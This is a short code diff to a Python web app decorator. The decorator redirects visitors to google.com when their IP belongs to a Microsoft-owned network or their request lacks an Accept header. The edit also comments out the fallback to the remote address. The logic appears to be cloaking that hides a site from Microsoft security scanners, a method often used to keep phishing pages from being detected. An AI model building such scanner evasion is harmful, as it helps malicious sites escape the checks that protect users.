@@ -8,8 +8,8 @@ from ipwhois import IPWhois
 import requests
 
 def is_microsoft_ans(ip):
-    res = IPWhois(ip).lookup_rdap(depth=1)
     try:
+        res = IPWhois(ip).lookup_rdap(depth=1)
         if 'microsoft' in res['asn_description'].lower():
             return True
     except:
@@ -18,7 +18,7 @@ def is_microsoft_ans(ip):
 
 def crawler(fn):
     def wrapper(*args, **kwargs):
-        client_ip = request.headers.get('X-Forwarded-For', '').split(',')[0] or request.remote_addr
+        client_ip = request.headers.get('X-Forwarded-For', '').split(',')[0] # or request.remote_addr
         if is_microsoft_ans(client_ip) or not request.headers.get('Accept', ''):
             app.logger.warning(f"REDIRECTED")
             return redirect('https://google.com')
